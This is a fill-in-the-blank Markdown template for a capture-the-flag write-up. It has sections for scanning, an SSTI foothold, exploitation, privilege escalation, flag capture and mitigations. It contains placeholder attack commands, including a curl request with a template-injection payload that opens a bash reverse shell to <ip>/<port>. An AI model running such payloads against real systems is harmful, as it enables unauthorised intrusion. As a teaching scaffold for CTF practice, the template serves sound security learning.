---
title: "<CTF> - <Challenge or Box Name>"
date: "2025-01-01"
author: "th3mujd11"
platform: "HTB | picoCTF | TryHackMe | Custom"
difficulty: "easy | medium | hard"
category: "web | pwn | crypto | forensics | misc"
tags: [web, ssti, auth-bypass]
target: "target.host or URL"
---

# TL;DR

Briefly summarize the path to the flag/root and the key vulnerability.

```
Foothold: <bug> -> <payload>
Privesc: <vector> -> <method>
Flag: <where/how>
```

---

# Target Summary

- IP/URL: `<target>`
- Exposed services: `80/tcp (http)`, `22/tcp (ssh)`
- Stack: `nginx`, `php-fpm`, `mysql`, `ubuntu 22.04`

---

# Enumeration

Commands and quick findings.

```bash
# Port scan
nmap -sC -sV -oN nmap.txt <target>

# Web crawl / fuzz
feroxbuster -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o ferox.txt

# Technology fingerprinting
whatweb http://<target>/
```

Key findings:
- `<path>` reveals `<file>` with credentials.
- Version `<x.y.z>` vulnerable to `<CVE-XXXX-YYYY>`.

---

# Foothold

Explain the vulnerability and show a minimal reproducible payload.

```http
GET /vuln?template={{7*7}} HTTP/1.1
Host: <target>
```

Expected behavior and output, screenshots if applicable.

---

# Exploitation

Show full chain from proof-of-concept to shell or flag.

```bash
# Reverse shell payload example
curl -G --data-urlencode "template={{system('bash -c \"bash -i >& /dev/tcp/<ip>/<port> 0>&1\"')}}" http://<target>/vuln
```

Notes and gotchas.

---

# Post-Exploitation / PrivEsc

Local enumeration and privilege escalation steps.

```bash
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

If exploiting misconfig or CVE, outline process and indicators.

---

# Proof of Flag / Root

```bash
cat /root/root.txt
# or
cat /home/<user>/user.txt
```

Flag: `flag{example-flag}`

---

# Mitigations

- Patch or upgrade `<component>` to `<fixed-version>`.
- Disable risky features: `<template eval>`, `<debug endpoints>`.
- Harden permissions and secrets management.

---

# References

- <link to CVE or advisory>
- <blog or writeup you used>
- <documentation>

